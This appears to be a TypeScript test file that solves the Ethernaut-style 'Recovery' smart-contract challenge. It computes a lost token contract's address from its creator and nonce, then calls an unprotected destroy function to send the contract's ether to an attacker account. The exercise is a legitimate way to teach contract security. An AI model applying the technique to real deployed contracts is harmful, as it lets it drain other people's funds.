
import { accounts, contract } from '@openzeppelin/test-environment';

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Recovery = contract.fromArtifact('Recovery');
const RecoveryAttack = contract.fromArtifact('RecoveryAttack');
const SimpleToken = contract.fromArtifact('SimpleToken');
let recovery: any;
let recoveryAttack: any;
let simpleToken: any;

beforeEach(async () => {
    recovery = await Recovery.new(attacker, { from: owner });
    recoveryAttack = await RecoveryAttack.new({ from: attacker });
});

it('Recovery -> recover (or remove) the 0.5 ether from the lost contract address', async () => {

    // The recovery creates a new SimpleToken contract, but the address is unknown
    await recovery.generateToken('Tokenin', 50, { from: owner });

    // Function addressFrom() returns a new address given an existing address and nonce
    const simpleTokenAddress = await recoveryAttack.addressFrom(recovery.address, 1);

    // Access to the SimpleToken contract
    simpleToken = await SimpleToken.at(simpleTokenAddress);

    // Destroy SimpleToken contract
    await simpleToken.destroy(attacker);
});
